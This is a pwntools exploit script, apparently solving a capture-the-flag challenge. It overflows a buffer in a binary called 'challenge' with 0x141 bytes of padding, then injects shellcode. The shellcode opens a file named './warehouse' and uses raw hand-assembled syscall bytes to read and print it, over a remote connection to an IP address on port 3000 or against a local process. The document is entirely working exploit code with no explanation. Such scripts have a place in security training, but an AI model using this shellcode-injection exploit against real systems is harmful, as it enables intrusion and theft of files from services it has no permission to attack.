#!/usr/bin/python3

from pwn import *

exe = ELF('challenge', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
b*0x401390

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.126.117.161', 3000)
else:
        p = process(exe.path)
GDB()

payload = b'a'*0x141
payload += asm(shellcraft.open("./warehouse"))
payload += b"\x48\xC7\xC7\x04\x00\x00\x00\x48\x89\xE6\x48\x83\xC6\x50\x48\xC7\xC2\x00\x02\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\xCD\x80"
payload += b"\x50\x48\x89\xE6\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x30\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"

sl(payload)
p.interactive()
